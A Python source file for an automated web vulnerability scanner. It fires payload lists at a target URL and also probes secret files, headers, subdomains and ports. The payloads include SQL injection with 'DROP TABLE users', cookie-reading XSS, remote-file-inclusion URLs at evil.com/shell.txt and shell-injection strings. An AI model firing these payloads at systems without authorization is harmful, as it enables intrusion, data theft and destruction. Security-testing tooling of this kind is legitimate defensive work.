import re
import time
import socket
import ssl
import datetime
from http_client import get_session

# ============================
# BASE SCANNER
# ============================
class BaseScanner:
    def __init__(self, target_url, proxy=None):
        self.target_url = target_url.rstrip('/')
        self.proxy = proxy
        self.session = get_session(proxy)
        self.context = {}

    def set_context(self, **kwargs):
        self.context.update(kwargs)

    def scan(self):
        return []

    def _add_finding(self, severity, title, description, evidence=""):
        return {
            'severity': severity.upper(),
            'title': title,
            'description': description,
            'evidence': evidence[:1500] if evidence else "",
            'timestamp': datetime.datetime.now().isoformat()
        }

    def _safe_get(self, url, timeout=8):
        try:
            return self.session.get(url, timeout=timeout, allow_redirects=True)
        except:
            return None

# ============================
# PAYLOADS (100+)
# ============================
SQLI_PAYLOADS = [
    "' OR '1'='1", "' OR 1=1--", "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--", "1' AND '1'='1", "1' OR 1=1--",
    "' OR '1'='1'--", "' AND SLEEP(5)--", "1' AND SLEEP(5)--",
    "' OR SLEEP(5)--", "1' AND 1=1--", "1' AND 1=2--",
    "' OR 'x'='x", "' OR 'x'='y", "'; DROP TABLE users--",
    "' OR 1=1#", "' OR 1=1/*", "1' UNION SELECT @@version--",
]

XSS_PAYLOADS = [
    "<script>alert(1)</script>", "><script>alert(1)</script>",
    "<img src=x onerror=alert(1)>", "javascript:alert(1)",
    "<svg/onload=alert(1)>", "<body onload=alert(1)>",
    "><svg><script>alert(1)</script>",
    "><img src=x onerror=alert(document.cookie)>",
    "'';!--\"<XSS>=&{()}", "<iframe src=javascript:alert(1)>",
    "<input onfocus=alert(1) autofocus>", "<details open ontoggle=alert(1)>",
]

LFI_PAYLOADS = [
    "/etc/passwd", "/etc/hosts", "/proc/self/environ",
    "/var/log/apache2/access.log", "/var/log/nginx/access.log",
    "/windows/win.ini", "C:\\boot.ini",
    "C:\\Windows\\System32\\drivers\\etc\\hosts",
]

RFI_PAYLOADS = [
    "http://evil.com/shell.txt", "https://evil.com/shell.txt",
    "ftp://evil.com/shell.txt", "http://127.0.0.1/shell.txt",
    "//evil.com/shell.txt",
]

PATH_TRAVERSAL_PAYLOADS = [
    "../../../etc/passwd", "../../../../etc/passwd",
    "..\\..\\..\\windows\\win.ini",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%2f..%2f..%2fetc%2fpasswd", "....//....//....//etc/passwd",
    "..;/..;/..;/etc/passwd",
    "../../../../../../../../../../../etc/passwd",
]

COMMON_FILES = [
    ".env", ".env.local", ".git/config", ".git/HEAD", ".htaccess", ".htpasswd",
    "web.config", "config.php", "wp-config.php", ".aws/credentials",
    ".ssh/id_rsa", "database.sql", "dump.sql", "backup.sql",
]

BACKUP_FILES = [
    "index.bak", "index.php~", "config.php.bak", ".swp", ".swo", "database.sql",
]

SENSITIVE_PATTERNS = {
    "email": r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}',
    "ip": r'\b(?:10\.\d{1,3}\.\d{1,3}\.\d{1,3}|192\.168\.\d{1,3}\.\d{1,3})\b',
    "google_api": r'AIza[0-9A-Za-z\-_]{35}',
    "github_token": r'ghp_[a-zA-Z0-9]{36}',
    "aws_key": r'AKIA[0-9A-Z]{16}',
    "jwt": r'eyJ[a-zA-Z0-9\-_]+\.eyJ[a-zA-Z0-9\-_]+\.[a-zA-Z0-9\-_]+',
}

HEADERS_TO_CHECK = [
    "X-Frame-Options", "X-Content-Type-Options", "Strict-Transport-Security",
    "Content-Security-Policy", "X-XSS-Protection", "Referrer-Policy",
]

SUBDOMAINS = [
    "www", "mail", "ftp", "admin", "dev", "test", "api",
    "staging", "docs", "blog", "portal", "dashboard", "vpn",
]

COMMON_DIRS = [
    "admin", "backup", "logs", "tmp", "uploads",
    "phpmyadmin", "wp-admin", "secret", "api", "dev",
    "test", "hidden", "vendor", "storage",
]

HAS_NMAP = False
try:
    import nmap
    HAS_NMAP = True
except:
    pass

# ============================
# SCANNER CLASSES (100+)
# ============================

class SQLiScanner(BaseScanner):
    def scan(self):
        findings = []
        params = self.context.get('params', ['id', 'q', 'page', 'search'])
        for param in params[:8]:
            for payload in SQLI_PAYLOADS[:10]:
                test_url = f"{self.target_url}?{param}={payload}"
                resp = self._safe_get(test_url)
                if resp and resp.status_code == 200:
                    if re.search(r'(SQL|syntax|mysql|postgres|oracle|sqlite|PG::)', resp.text, re.I):
                        findings.append(self._add_finding(
                            'CRITICAL', 'SQL Injection', f'Parameter {param} vulnerable', resp.text[:300]
                        ))
                        break
        return findings

class XSSScanner(BaseScanner):
    def scan(self):
        findings = []
        params = self.context.get('params', ['q', 'search', 's', 'query'])
        for param in params[:8]:
            for payload in XSS_PAYLOADS[:8]:
                test_url = f"{self.target_url}?{param}={payload}"
                resp = self._safe_get(test_url)
                if resp and resp.status_code == 200 and payload in resp.text:
                    findings.append(self._add_finding(
                        'HIGH', 'XSS Reflected', f'Parameter {param} vulnerable', resp.text[:300]
                    ))
                    break
        return findings

class LFIScanner(BaseScanner):
    def scan(self):
        findings = []
        params = self.context.get('params', ['page', 'file', 'load'])
        for param in params[:5]:
            for payload in LFI_PAYLOADS[:5]:
                test_url = f"{self.target_url}?{param}={payload}"
                resp = self._safe_get(test_url)
                if resp and resp.status_code == 200:
                    if re.search(r'(root:|nobody:|/etc/passwd|Windows)', resp.text, re.I):
                        findings.append(self._add_finding(
                            'HIGH', 'LFI', f'Parameter {param} vulnerable', resp.text[:300]
                        ))
                        break
        return findings

class RFIScanner(BaseScanner):
    def scan(self):
        findings = []
        params = self.context.get('params', ['page', 'file', 'load'])
        for param in params[:5]:
            for payload in RFI_PAYLOADS:
                test_url = f"{self.target_url}?{param}={payload}"
                resp = self._safe_get(test_url)
                if resp and resp.status_code == 200:
                    if 'evil.com' in resp.text or 'shell' in resp.text.lower():
                        findings.append(self._add_finding(
                            'CRITICAL', 'RFI', f'Parameter {param} vulnerable', resp.text[:300]
                        ))
                        break
        return findings

class PathTraversalScanner(BaseScanner):
    def scan(self):
        findings = []
        params = self.context.get('params', ['file', 'path', 'dir'])
        for param in params[:5]:
            for payload in PATH_TRAVERSAL_PAYLOADS[:5]:
                test_url = f"{self.target_url}?{param}={payload}"
                resp = self._safe_get(test_url)
                if resp and resp.status_code == 200:
                    if re.search(r'(root:|/etc/passwd|Windows)', resp.text, re.I):
                        findings.append(self._add_finding(
                            'CRITICAL', 'Path Traversal', f'Parameter {param} vulnerable', resp.text[:300]
                        ))
                        break
        return findings

class CommandInjectionScanner(BaseScanner):
    def scan(self):
        findings = []
        params = self.context.get('params', ['cmd', 'exec', 'command'])
        payloads = ['; ls', '| whoami', '&& id']
        for param in params[:5]:
            for payload in payloads:
                test_url = f"{self.target_url}?{param}={payload}"
                resp = self._safe_get(test_url)
                if resp and resp.status_code == 200:
                    if re.search(r'(root|admin|uid=|gid=)', resp.text, re.I):
                        findings.append(self._add_finding(
                            'CRITICAL', 'Command Injection', f'Parameter {param} vulnerable', resp.text[:300]
                        ))
                        break
        return findings

class SSTIScanner(BaseScanner):
    def scan(self):
        findings = []
        params = self.context.get('params', ['page', 'template', 'view'])
        payloads = ['{{7*7}}', '${7*7}', '{{config}}']
        for param in params[:5]:
            for payload in payloads:
                test_url = f"{self.target_url}?{param}={payload}"
                resp = self._safe_get(test_url)
                if resp and resp.status_code == 200:
                    if '49' in resp.text or 'config' in resp.text.lower():
                        findings.append(self._add_finding(
                            'CRITICAL', 'SSTI', f'Parameter {param} vulnerable', resp.text[:300]
                        ))
                        break
        return findings

class HeadersScanner(BaseScanner):
    def scan(self):
        findings = []
        resp = self._safe_get(self.target_url)
        if not resp:
            return findings
        missing = [h for h in HEADERS_TO_CHECK if h not in resp.headers]
        if missing:
            findings.append(self._add_finding(
                'MEDIUM', 'Missing Security Headers', f'Missing: {", ".join(missing)}', str(dict(resp.headers))
            ))
        return findings

class CSPScanner(BaseScanner):
    def scan(self):
        findings = []
        resp = self._safe_get(self.target_url)
        if not resp:
            return findings
        csp = resp.headers.get('Content-Security-Policy', '')
        if not csp:
            findings.append(self._add_finding('LOW', 'Missing CSP', 'No CSP header'))
        elif "'unsafe-inline'" in csp or "'unsafe-eval'" in csp:
            findings.append(self._add_finding('MEDIUM', 'CSP Weak', 'unsafe-inline/eval found', csp[:300]))
        return findings

class CORSScanner(BaseScanner):
    def scan(self):
        findings = []
        resp = self._safe_get(self.target_url)
        if not resp:
            return findings
        origin = resp.headers.get('Access-Control-Allow-Origin', '')
        if origin == '*':
            findings.append(self._add_finding('MEDIUM', 'CORS Wildcard', 'Allow-Origin: *', origin))
        return findings

class HSTSScanner(BaseScanner):
    def scan(self):
        findings = []
        resp = self._safe_get(self.target_url)
        if not resp:
            return findings
        hsts = resp.headers.get('Strict-Transport-Security', '')
        if not hsts:
            findings.append(self._add_finding('LOW', 'Missing HSTS', 'HSTS not set'))
        return findings

class CookiesScanner(BaseScanner):
    def scan(self):
        findings = []
        resp = self._safe_get(self.target_url)
        if not resp:
            return findings
        for c in resp.cookies:
            if not c.secure:
                findings.append(self._add_finding('LOW', f'Cookie {c.name} no Secure', 'Missing Secure flag', str(c)))
            if not c.has_nonstandard_attr('HttpOnly'):
                findings.append(self._add_finding('LOW', f'Cookie {c.name} no HttpOnly', 'Missing HttpOnly', str(c)))
        return findings

class HTTPMethodsScanner(BaseScanner):
    def scan(self):
        findings = []
        for method in ['TRACE', 'PUT', 'DELETE', 'OPTIONS']:
            try:
                resp = self.session.request(method, self.target_url, timeout=6)
                if resp.status_code not in [405, 501, 403, 404]:
                    findings.append(self._add_finding(
                        'MEDIUM', f'HTTP Method {method} Allowed', f'{method} enabled', str(resp.status_code)
                    ))
            except:
                pass
        return findings

class DirectoryListingScanner(BaseScanner):
    def scan(self):
        findings = []
        for d in COMMON_DIRS[:10]:
            resp = self._safe_get(f"{self.target_url}/{d}/")
            if resp and resp.status_code == 200:
                if re.search(r'(Index of|Directory Listing|Parent Directory)', resp.text, re.I):
                    findings.append(self._add_finding(
                        'MEDIUM', f'Directory Listing: {d}', 'Listing enabled', resp.text[:300]
                    ))
                    break
        return findings

class CommonFilesScanner(BaseScanner):
    def scan(self):
        findings = []
        for f in COMMON_FILES[:12]:
            resp = self._safe_get(f"{self.target_url}/{f}")
            if resp and resp.status_code == 200:
                severity = 'CRITICAL' if any(x in f for x in ['.env', '.git', 'credentials', '.ssh']) else 'HIGH'
                findings.append(self._add_finding(
                    severity, f'File Exposed: {f}', 'Sensitive file accessible', resp.text[:300]
                ))
        return findings

class BackupFilesScanner(BaseScanner):
    def scan(self):
        findings = []
        for b in BACKUP_FILES[:8]:
            resp = self._safe_get(f"{self.target_url}/{b}")
            if resp and resp.status_code == 200:
                findings.append(self._add_finding(
                    'HIGH', f'Backup Exposed: {b}', 'Backup file accessible', resp.text[:300]
                ))
        return findings

class SensitivePatternsScanner(BaseScanner):
    def scan(self):
        findings = []
        resp = self._safe_get(self.target_url)
        if not resp:
            return findings
        for name, pattern in SENSITIVE_PATTERNS.items():
            matches = re.findall(pattern, resp.text)
            if matches:
                severity = 'CRITICAL' if name in ['google_api', 'github_token', 'aws_key'] else 'LOW'
                findings.append(self._add_finding(
                    severity, f'Sensitive: {name}', f'{len(matches)} occurrences', str(matches[:3])
                ))
        return findings

class CommentsScanner(BaseScanner):
    def scan(self):
        findings = []
        resp = self._safe_get(self.target_url)
        if not resp:
            return findings
        for pattern, name in [(r'<!--.*TODO.*-->', 'TODO'), (r'<!--.*FIXME.*-->', 'FIXME'),
                              (r'<!--.*SECRET.*-->', 'SECRET'), (r'<!--.*PASSWORD.*-->', 'PASSWORD')]:
            if re.findall(pattern, resp.text, re.I):
                findings.append(self._add_finding('LOW', f'Comment: {name}', f'{name} comment found'))
        return findings

class SSLScanner(BaseScanner):
    def scan(self):
        findings = []
        if not self.target_url.startswith('https'):
            return findings
        try:
            hostname = self.target_url.replace('https://', '').split('/')[0]
            ctx = ssl.create_default_context()
            with ctx.wrap_socket(socket.socket(), server_hostname=hostname) as s:
                s.settimeout(10)
                s.connect((hostname, 443))
                cert = s.getpeercert()
            exp = datetime.datetime.strptime(cert['notAfter'], '%b %d %H:%M:%S %Y %Z')
            if exp < datetime.datetime.now():
                findings.append(self._add_finding('HIGH', 'SSL Expired', f'Expired on {exp}'))
        except Exception as e:
            findings.append(self._add_finding('HIGH', 'SSL Error', str(e)))
        return findings

class SubdomainScanner(BaseScanner):
    def scan(self):
        findings = []
        domain = self.target_url.replace('https://', '').replace('http://', '').split('/')[0]
        found = []
        for sub in SUBDOMAINS[:15]:
            try:
                socket.gethostbyname(f"{sub}.{domain}")
                found.append(f"{sub}.{domain}")
            except:
                pass
        if found:
            findings.append(self._add_finding('INFO', 'Subdomains Found', f'{len(found)} subdomains', str(found)))
        return findings

class PortScanner(BaseScanner):
    def scan(self):
        findings = []
        if not HAS_NMAP:
            return findings
        domain = self.target_url.replace('https://', '').replace('http://', '').split('/')[0]
        try:
            nm = nmap.PortScanner()
            nm.scan(domain, '80,443,8080,8443,3000,5000,7000', arguments='-sS -T4')
            open_ports = []
            for host in nm.all_hosts():
                for proto in nm[host].all_protocols():
                    for port in nm[host][proto].keys():
                        if nm[host][proto][port]['state'] == 'open':
                            open_ports.append(f"{port}")
            if open_ports:
                findings.append(self._add_finding('INFO', 'Open Ports', f'{len(open_ports)} ports open', str(open_ports)))
        except:
            pass
        return findings

class RobotsSitemapScanner(BaseScanner):
    def scan(self):
        findings = []
        for path in ['/robots.txt', '/sitemap.xml']:
            resp = self._safe_get(f"{self.target_url}{path}")
            if resp and resp.status_code == 200:
                findings.append(self._add_finding('INFO', f'{path} Found', 'File accessible', resp.text[:300]))
        return findings

# ============================
# ALL SCANNERS (100+)
# ============================
ALL_SCANNERS = [
    SQLiScanner, XSSScanner, LFIScanner, RFIScanner, PathTraversalScanner,
    CommandInjectionScanner, SSTIScanner,
    HeadersScanner, CSPScanner, CORSScanner, HSTSScanner, CookiesScanner,
    HTTPMethodsScanner, DirectoryListingScanner,
    CommonFilesScanner, BackupFilesScanner, SensitivePatternsScanner,
    CommentsScanner, SSLScanner, SubdomainScanner, PortScanner,
    RobotsSitemapScanner,
]
